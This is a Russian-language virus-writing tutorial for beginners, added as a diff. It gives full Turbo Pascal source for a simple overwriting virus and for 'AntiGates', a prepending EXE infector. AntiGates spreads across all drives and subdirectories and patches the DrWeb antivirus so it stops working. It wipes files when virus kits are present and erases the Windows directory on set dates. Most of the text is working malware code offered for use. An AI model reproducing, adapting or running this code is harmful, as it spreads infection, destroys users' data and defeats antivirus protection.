@@ -1,0 +1,651 @@
+
+                 ╔═══════════════════════════════════════════╗
+                 ║ ■                                       ■ ║
+                 ║      █▀ █▀▄ █▀ █▀█ ▀█▀ █ █ █▀▄ █▀ █▀▀     ║
+                 ║  THE █  █▄▀ █▄ █▄█  █  █ █ █▄▀ █▄ █▄▄     ║
+                 ║      █▄ █ █ █▄ █ █  █  █▄█ █ █ █▄ ▄▄█     ║
+                 ║ ■                                       ■ ║
+                 ╚═══════════════════════════════════════════╝
+
+                            Для ламеров                        (c) DEC0DER
+
+     Данная  статья  будет  полезна  для  тех,  кто хочет писать вирусы, но не
+знает,   с   чего   начать.   Прежде   всего  надо  выбрать  язык,  в  смысле,
+программировния.  Для начала лучше всего подпйдет Паскаль. Можно конечто взять
+какой-нибудь  Бейсик,  Си  ...,  но у них есть уйма недостатков, так что проще
+изучить Паскаль, чем маяться с чем-то из вышеперечисленного.
+     Что  надо  для  этого  знать  и  уметь?  Прежде всего, знать Паскаль хоть
+как-то,  т.е.  работа  с  файлами,  процедурами, разными переменными - хотя бы
+представлять, что это такое.
+     С  чего  начать? Простенький HLLO (High Level Language Overwriter) вполне
+подойдет для начала.
+     Некоторые полезные вещи:
+
+     а) Имеет смысл поставить в начале константу VIRSIZE=размер откомпиленного
+     вируса и менять ее при каждой новой компиляции.
+
+     б) Объявлять файл не TEXT и не FILE OF какое-нибудь г, а просто FILE
+     (VAR F:FILE;).
+
+     в) Пользоваться BLOCKREAD/BLOCKWRITE.
+
+     А вот собственно и начало.
+
+uses .....;
+const
+      virsize=1234; - любое число больне 255 и меньше 65536.
+var
+    .
+    .
+    .
+    .
+    .
+begin
+      Первая часть - считать себя из файла.
+      assign(tmpf,paramstr(0));
+      reset(tmpf,1);
+
+      blockread(tmpf,virbody,virsize);
+                      ^Здесь virbody - массив, состоящий из virsize байт.
+      close(tmpf);
+
+      далее надо поискать EXE-файлы.
+      findfirst('*.exe',Archive,srexe);
+                                  ^А эта переменная типа SEARCHREC
+      while doserror=0 do begin - ищем пока не кончится
+            infect(srexe.name); - залезаем в них
+            findnext(srexe);
+      end;
+      Все сделали
+      writeln('Прювет, чувак');
+end.
+
+procedure infect(fname:string); - заражаем файл
+var
+    .
+    .
+    .
+begin
+      assign(victim,fname);
+      reset(victim,1); - можно rewrite
+
+      blockwrite(victim,virbody,virlen); - пишем себя в начало
+
+      close(victim);
+end;
+
+        А вот готовый оверрайтер:
+
+-------------------------------------8<---------------------------------------
+{Pascal v. 6.0}
+uses dos;
+const
+     virsize=3488;
+var
+   tmpf:file;
+   virbody:array[1..virsize] of byte;
+   srexe:searchrec;
+
+procedure infect(fname:string);
+var
+   victim:file;
+begin
+     assign(victim,fname);
+     reset(victim,1);
+
+     blockwrite(victim,virbody,virsize);
+     close(victim);
+end;
+
+begin
+     assign(tmpf,paramstr(0));
+     reset(tmpf,1);
+
+     blockread(tmpf,virbody,virsize);
+
+     close(tmpf);
+
+     findfirst('*.exe',Archive,srexe);
+     while doserror=0 do begin
+           infect(srexe.name);
+           findnext(srexe);
+     end;
+
+     writeln('Hello, world!');
+end.
+-------------------------------------8<---------------------------------------
+
+
+     Overwriter конечно вирус, но все же полное говно. Он не запускает жертву,
+и  каким  бы  навороченным  он ни был, его моментально обнаружат. Поэтому есть
+необходимость  как-то  запускать  зараженный  файл.  Существуют  два  наиболее
+распространенных  способа  заражения  с  сохранением  жертв  для  последующего
+запуска.
+     Первый  -  сохранение  жертвы в левом файле и последующий ее запуск. Этот
+способ  не намного проще второго, но значительно менее эффективный, поэтому он
+не будет рассматриваться.
+     Второй  вариант  заражения  -  приписывать  жертву в конец, а при запуске
+сбрасывать  на  винт  под  любым  именем  и запускать. При этом умный чукча не
+офигеет, увидив в какой-нибудь жопе уйму файлов с расширением "CPH".
+     Как можно реализовать второй способ:
+     a) Просто дописать в конец всю жертву, а потом засунуть ее на винт под
+     именем TMP.EXE и запустить. Это тоже нехорошо, т.к. читать весь файл,
+     а затем его писать - очень долго.
+     б) Считать начальную часть файла, равную длине вируса, записать в начало
+     вирус, а считанную часть - в конец.
+
+     Рассмотрим случай б)
+
+     Для начала надо кое-что подготовить: считать вирус из нашего файла.
+
+
+     assign(tmpf,paramstr(0)); - открытие
+     reset(tmpf,1);
+
+     blockread(tmpf,virbody,virsize); - чтение тела вируса
+
+     close(tmpf); - закроем файл
+
+     Далее ищем файлы как в оверрайтере и инфицируем их.
+
+     Процедура зараажения:
+procedure infect(filetoinfect:string);
+var
+    .
+    .
+    .
+    .
+begin
+     assign(victim,filetoinfect);
+     reset(victim,1);
+
+     Далее надо проверить, есть ли вирус в файле ?
+     if virusexist(victim) then exit;
+
+     А не много ли мы заразили?
+     if infcount>infmax then exit;
+
+     А не мал ли найденный файл?
+     if filesize(victim)<virsize then exit;
+
+     Теперь само заражение:
+
+     считываем начало в буфер
+     seek(victim,0);
+     blockread(victim,buffer,virsize); Buffer - такой же массив, как и virbody
+
+     пишем вирус на место считанной части
+     seek(victim,0);
+     blockwrite(victim,virbody,virsize);
+
+     идем в конец файла
+     seek(victim,filesize(victim));
+
+     и пишем здесь оригинальное нaчало
+     blockwrite(victim,bufffer,virsize);
+
+     еще надо записать идентификатор
+     blockwrite(victim,ID,IDsize);
+     ID может быть какой угодно массив (byte, char) размером IDsize.
+     Если ID - string, то IDsize должен быть равен длине строки + 1.
+
+     close(victim);
+
+     Жедательно еще поставить счетчик заражений.
+     inc(infcount);
+
+end;
+
+функция проверки присутствия вируса в файле:
+function virusexist(testfile:file);
+var
+    .
+    .
+    .
+    .
+begin
+     seek(testfile,filesize(testfile)-IDsize); - на начало идентификатора
+
+     blockread(testfile,testID,IDsize); - Читаем идентификатор
+
+
+     if testID = ID then virusexist:=true else virusexist:=false;
+
+end;
+
+Теперь о запуске зараженного таким образом файла.
+
+procedure execus;
+var
+    .
+    .
+    .
+    .
+begin
+     Какая у нас командная строка была?
+     ourparam:=' /C ';
+     for i:=0 to paramcount do ourparam:=ourparam+paramstr(i);
+
+     assign(tmpf,paramstr(0));
+     reset(tmpf,1);
+
+     seek(tmpf,filesize(tmpf)-virsize-IDsize); - перешли на оригинальное начало
+
+     blockread(tmpf,buffer,virsize); - считали его
+
+     seek(tmpf,0); - в начало файла
+
+     blockwrite(tmpf,buffer,virsize); - записываем оригинальное начало
+
+     seek(tmpf,filesize(tmpf)-virsize-IDsize); - перешли на бывший конец файла
+
+     truncate(tmpf); - восстановили исходный размер
+
+     close(tmpf);
+
+     exec(getenv('COMSPEC'),ourparam); - запускаем жертву
+
+     infect(paramstr(0)); - заражаем снова
+
+end;
+
+Комментарии:
+    * При запуске жертва восстанавливается до оригинального состояния,
+    т.е. имя, размер те же и запускается command.com'ом с параметром "/C".
+    * Нужно уменьшить размер памяти, отводимый вирусу, т.к. не хватит
+    на жертву (см. строки 1 и 2 в примере)
+
+Далее идет готовый вирус.
+
+-------------------------------------8<---------------------------------------
+{$M 5000 , 0 , 10000}
+{ ^ обломим вирусу память}
+{
+
+        Описание:
+        Вирус AntiGates является первым более менее доработанным мной вирусом
+        Бегает по (!) всему винту и заражает *.exe во всех текущих, корневых
+        и поддирах. Так шо где-нибудь типа E:\POLIGON испытывать не рекомендуется,
+        заразишь все виндузы. Портит DRWEB. Пятого и восьмого числа каждого месяца
+        вытирает гейтсовское говно с диска. Конструкторы уничтожаются моментально,
+        да так, что даже UNERASE не помогает.}
+
+{$A- $B- $D- $E+ $F-,$G-,$I-,$L-,$N-,$S-,$V-,$X+}
+{ шоб лишний раз не ругалось}
+
+Uses Dos;
+
+Const
+     MaxSize=5000000;{Особо жирые нм не к лицу}
+     VirName='AntiGates';{ - название}
+     realid:String[6]='VAGNER';{ - id, могут быть любые шесть символов.}
+
+     VirLen=5546;{ - длина EXE. Не забудьте сменть.}
+
+     Author='DEC0DER';{ - автор}
+     counter=15;{ - max заражений за один раз}
+     Describ='Самоходный ветеринар. уничтожает вирус WIN95.based'+#10+#13+
+             'Также борется с вирусными генераторами на ламерских машинах';
+
+
+
+Var
+    id:Array[1..6] of Char;
+    virfile:File;
+    ourparam:String;
+    myname:PathStr;
+    i,disk:Integer;
+    filetoinfect:File;
+    TargetFile:PathStr;
+    VirBuf:Array [1..VirLen] of byte;
+    TargetBuf:Array [1..VirLen] of byte;
+    Attr:Word;
+    Time:LongInt;
+    InfFiles:Byte;
+    DirInfo:SearchRec;
+    LabelBuf:Array [1..6] of Char;
+    TDIR:dirstr;
+    TNAME:namestr;
+    TEXTrn:EXTSTR;
+    key,rekey:byte;
+    dirsrch:searchrec;
+    s:string;
+{     /\
+      ||
+      толпа переменных. Наверное нужна была за чем-то, ща уже не помню, зачем}
+
+
+procedure destroy(vext:string);
+var
+   virusc:file;
+   src:searchrec;
+begin
+     exec(getenv('COMSPEC'),' attrib -r');
+     findfirst(vext,$3f,src);{ - ищем все для уничтожения}
+     while doserror=0 do begin
+           if src.attr<>Directory then begin
+           assign(virusc,src.name);
+           rewrite(virusc);{ - против UNERASE}
+           close(virusc);
+           erase(virusc);
+           findnext(src);
+           end;
+     end;
+end;
+
+procedure Init;
+  begin
+     randomize;
+
+     myname:=ParamStr(0);{ - наше имя}
+
+     LabelBuf[1]:=realid[1];
+     LabelBuf[2]:=realid[2];
+     LabelBuf[3]:=realid[3];
+     LabelBuf[4]:=realid[4];
+     LabelBuf[5]:=realid[5];
+     LabelBuf[6]:=realid[6];
+
+     InfFiles:=0;
+
+     ourparam:='';
+
+     Assign(virfile , ParamStr(0));
+     Reset(virfile , 1);
+
+     BlockRead(virfile , VirBuf , VirLen); { - читаем себя}
+     Seek(virfile,FileSize(virfile)-1);
+     BlockRead(virfile,reKey,1);{ - читаем ключ для раскодирования оригинального нчала}
+
+     Close(virfile);
+     Key:=trunc(random*256);{ - ключ для кодировки при этом запуске}
+     IF ParamCount <> 0 Then
+        Begin
+           For I:=1 To ParamCount Do
+             ourparam:=ourparam + ' ' + ParamStr(I);{ - наши параметры}
+        End;
+
+end;
+
+procedure ExecOriginal;{ - исполняем оригинальную прогрмму}
+  begin
+
+    FindFirst(ParamStr(0) , AnyFile , DirInfo);
+
+    Assign(virfile , ParamStr(0));
+
+    Time:=DirInfo.Time;
+    Attr:=DirInfo.Attr;{ - запоминаем атрибуты и дату}
+
+    SetFAttr(virfile , Archive);{ - делаем файл пригодным для записи}
+
+    Reset(virfile , 1);
+
+    Seek(virfile , DirInfo.Size - VirLen - 7);
+
+    BlockRead(virfile , TargetBuf , VirLen);{ - читаем закодированное оригинальное
+                                                начало}
+
+    Seek(virfile , DirInfo.Size - VirLen - 7);
+    Truncate(virfile);{ - обрезаем все лишнее}
+
+    for i:=1 to VirLen do TargetBuf[i]:=TargetBuf[i]-rekey+virbuf[i];{ - раскодируем}
+
+    Seek(virfile , 0);
+    BlockWrite(virfile , TargetBuf , VirLen);{ - и пишем оригинальное начало
+                                                 на место}
+
+    SetFTime(virfile , Time);
+    SetFAttr(virfile , Attr);{ - ставим старые атрибуты и ...}
+
+    Close(virfile);
+
+    SwapVectors;
+      Exec(myname , ourparam);{ ... запускаем}
+    SwapVectors;
+    {специально убрана проверка, как отработало:
+     места много занимет да и сaма программа как правило ругается}
+
+    { и далее заражаем прогу снова}
+
+    Assign(virfile , ParamStr(0));
+
+    SetFAttr(virfile , Archive);
+
+    Reset(virfile , 1);
+
+    BlockWrite(virfile , VirBuf , VirLen);
+
+    for i:=1 to VirLen do TargetBuf[i]:=TargetBuf[i]+rekey-virbuf[i];
+
+    Seek(virfile , DirInfo.Size - VirLen - 7);
+
+    BlockWrite(virfile , TargetBuf , VirLen);
+
+    Seek(virfile , DirInfo.Size - 7);
+
+    BlockWrite(virfile , LabelBuf , 6);
+
+    Seek(virfile,DirInfo.Size - 1);
+    blockwrite(virfile,rekey,1);
+
+    SetFTime(virfile , Time);
+    SetFAttr(virfile , Attr);
+
+    Close(virfile);
+
+end;
+
+
+procedure FindTarget;{ - процедура заражения каталога}
+
+Var
+   exesearch:SearchRec;
+
+function VirusPresent : Boolean;{ - процедура проверки файла на зараженность}
+  begin
+
+     VirusPresent:=False;
+
+     Assign(filetoinfect , TargetFile);
+     Reset(filetoinfect , 1);
+
+     Seek(filetoinfect , exesearch.Size - 7);{ - читаем идентификатор ... }
+     BlockRead(filetoinfect , id , 6);
+     close(filetoinfect);
+
+     If id = realid Then
+     VirusPresent:=True;{ ... и если он есть, то значет и мы там тоже}
+
+end;
+
+procedure InfectFile;{ - заражаем файл}
+  begin
+
+   If exesearch.Size <= VirLen  Then Exit;{если меньше себя, то плохо}
+   If exesearch.Size > MaxSize  Then Exit;{если очень большой, тоже плохо}
+
+   If Not VirusPresent Then { - проверяем на наличие себя}
+    begin
+
+       Time:=exesearch.Time;{ - запоминаем атрибуты}
+       Attr:=exesearch.Attr;
+
+       Assign(filetoinfect , TargetFile);
+       SetFAttr(filetoinfect, Archive); { - стaвим нормальные аатрибуты}
+       Reset(filetoinfect , 1);
+
+       if ioresult>0 then begin close(filetoinfect); exit; end;{ - проверка
+                                                     на защиту от записи}
+
+       BlockRead(filetoinfect , TargetBuf , VirLen);{ - читаем начало файла ...}
+
+       for i:=1 to VirLen do TargetBuf[i]:=TargetBuf[i]+key-virbuf[i];{ ... кодируем его}
+
+       Seek(filetoinfect , 0);
+       BlockWrite(filetoinfect, VirBuf, VirLen);{ - суем себя в начало
+                                                    на место считнной части}
+
+
+       Seek(filetoinfect , exesearch.Size);
+       BlockWrite(filetoinfect , TargetBuf , VirLen);{ - пишем закодированное
+                                                         начало в конец}
+
+       Seek(filetoinfect , exesearch.Size + VirLen);
+
+       BlockWrite(filetoinfect , LabelBuf , 6);{ - пишем идентификатор}
+
+       Seek(filetoinfect , exesearch.Size + VirLen + 6);
+       blockwrite(filetoinfect,key,1);{ - пишем ключ}
+
+       SetFAttr(filetoinfect , Attr);
+       SetFTime(filetoinfect , Time);{ - восстанавливаем оригинальные атрибуты}
+
+       Close(filetoinfect);
+
+       Inc(InfFiles);{ - еще один файл заразили}
+
+    end;
+end;
+
+procedure fuckdrweb;
+var
+   drweb:file;
+   c3:byte;
+begin
+     findfirst('DRWEB.EXE',$3f,exesearch);{ - ищем Данилова}
+     if doserror<>0 then exit;{- есл нету}
+
+     exec(getenv('COMSPEC'),' attrib -r');
+     assign(drweb,'drweb.exe');
+     reset(drweb,1);
+
+     c3:=$c3;
+     blockwrite(drweb,c3,1);{ - ставим ret вместо первого байта}
+
+     close(drweb);
+end;
+
+procedure destroyNRLG;
+
+begin
+     findfirst('NRLG.EXE',$3f,exesearch);{ - ищем конструктор}
+
+     if doserror<>0 then exit; { - нету - выходим}
+
+     destroy('*.asm');;{ - уничтожаем все намеки}
+     destroy('*.exe');
+     destroy('*.com');
+
+end;
+
+procedure destroyIVP;
+
+begin
+     findfirst('IVP.EXE',$3f,exesearch);{ - ищем конструктор}
+
+     if doserror<>0 then exit; { - нету - выходим}
+
+     destroy('*.asm');;{ - уничтожаем все намеки}
+     destroy('*.exe');
+     destroy('*.com');
+
+end;
+
+begin { - сама findtarget}
+      fuckdrweb;
+      destroyNRLG;{ - уничтожаем конструкторы}
+      destroyIVP;
+      FindFirst('*.EXE', Archive , exesearch);{ - ищем все ЕХЕшки}
+       While DosError = 0 Do
+         begin
+
+           If exesearch.Name='' Then Exit;{ - если ваще нету ЕХЕшек}
+
+           TargetFile:=exesearch.Name;{ - нашли}
+
+           InfectFile;{ - заражаем этот файл}
+
+           If InfFiles > counter Then Exit;{ - если заразили уже достаточно,
+                                             то выходим}
+
+           FindNext(exesearch);
+
+         end;
+end;
+
+Procedure FindSubTargets;{ - процедура поиска в поддиректориях}
+
+begin
+     findfirst('*.*',Directory,dirsrch);{ - ищем диры}
+     while doserror=0 do begin
+           if (dirsrch.attr=$10) and (dirsrch.name<>'..') and (dirsrch.name<>'.') then begin
+              chdir(dirsrch.name);{ - переходим в нaйденную}
+              findtarget;{ - позражаем в ней все}
+              chdir('..');{ - идем обрaтно и продолжаем поиск}
+           end;
+           FindNext(dirsrch);
+     end;
+end;
+
+procedure clearwin95;
+var
+   y, m, d, dow : Word;
+   wpath:string;
+begin
+     GetDate(y,m,d,dow);
+     if (d<>5) and (d<>8) then exit;{ - проверяем на нужное число}
+
+     destroy(copy(getenv('COMSPEC'),0,length(getenv('COMSPEC'))-11)+'*.*');
+     destroy(copy(getenv('COMSPEC'),0,length(getenv('COMSPEC'))-11)+'SYSTEM\*.*');
+     { - и подтираем какашки}
+end;
+
+begin
+
+     Init;
+
+     fsplit(paramstr(0),TDIR,TNAME,TEXTrn);
+     if TNAME<>'PROJECT' then ExecOriginal; { - если не инсталятор, то ...}
+
+     asm{ - против DEBUGGER'a, отрубает клаву}
+         PUSH AX
+         IN AL, 21h
+         OR AL, 03h
+         OUT 21h, AL
+         POP AX
+     end;
+
+     ClearWin95;
+
+     for disk:=3 to 26 do begin  { - ищем на всех дисках от С: до Z:}
+         if disksize(disk)<>-1 then   begin { - если такого диска не существует,
+                                                или это CD-ROM}
+            chdir(chr(disk+96)+':');{ - переходим на нужный диск:\текущий дир}
+            FindTarget;
+            FindSubTargets;{ - и заражаем все в округе}
+
+            chdir('\');
+                        {  то же сaмое в корне}
+            FindTarget;
+            FindSubTargets;
+         end;
+     end;
+
+     asm{ - снова врубаем клавиатуру}
+         PUSH AX
+         nop
+         IN AL, 21h
+         AND AL, 0FCh
+         OUT 21h, AL
+         POP AX
+     end;
+
+       If False Then { - а это шоб константы были}
+          begin
+             ourparam:=VirName;
+             ourparam:=Author;
+             ourparam:=Describ;
+          end;
+
+end.
